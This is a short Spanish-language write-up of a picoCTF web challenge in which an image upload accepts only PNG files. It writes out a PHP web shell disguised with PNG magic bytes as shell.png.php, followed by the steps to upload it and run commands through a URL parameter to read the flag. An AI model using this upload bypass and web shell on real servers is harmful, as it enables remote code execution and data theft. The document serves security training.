#Software #Hacking #WebExplotation #Web #Internet 
# Definición
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:63789/)!
# Hints
- (none)
# Solución
1. **Crear el archivo [[PHP]] malicioso**:
   ```bash
   echo -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]); ?>' > shell.png.php
   ```

2. **Súbirlo al servidor**:
   - Sube el archivo `shell.png.php` (el servidor validará que "parezca" PNG).

3. **Ejecuta comandos para obtener la bandera**:
   - Abre esta URL en tu navegador (reemplaza `<PUERTO>` si es necesario):
   - Esto listará los archivos en el directorio raíz. Busca un archivo `.txt` con nombre aleatorio (ej: `TG4SXKQ.txt`).

4. **Lee el archivo de la bandera**:
   - Ejecuta:
     ```
     http://atlas.picoctf.net:63789/uploads/shell.png.php?cmd=cat%20../NOMBRE_DEL_ARCHIVO.txt
     ```
   - La bandera estará en el contenido de este archivo.
## Respuesta